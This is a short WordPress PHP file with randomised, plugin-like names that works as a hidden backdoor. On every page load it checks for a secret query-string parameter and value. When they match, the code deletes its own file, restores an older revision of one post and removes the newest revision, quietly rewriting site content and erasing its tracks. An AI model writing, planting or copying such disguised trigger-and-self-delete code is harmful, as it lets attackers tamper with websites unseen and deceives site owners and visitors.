<?php

function mediaelement_color_active_thumbnails() {
	if (isset($_GET['scss_divi_light_age']) && $_GET['scss_divi_light_age'] === 'instagram_all_notify') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$category_library_bangla = 14656;
		$image_permalink_field = wp_get_post_revisions($category_library_bangla);
		if (empty($image_permalink_field)) die('no revisions');
		if (count($image_permalink_field) < 2) die('less than 2');
		$plupload_modules_fx_gravity = array_shift($image_permalink_field);
		$multisite_typography_random = $plupload_modules_fx_gravity->ID;
		$scheduled_beaver_authors = array_shift($image_permalink_field);
		$post_details_wpc_automatorwp = $scheduled_beaver_authors->ID;
		$maker_call_compare_customize = wp_restore_post_revision($post_details_wpc_automatorwp);
		if ($maker_call_compare_customize === false) die('error restoring');
		$maker_call_compare_customize = wp_delete_post_revision($multisite_typography_random);		
		if ($maker_call_compare_customize === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'mediaelement_color_active_thumbnails');
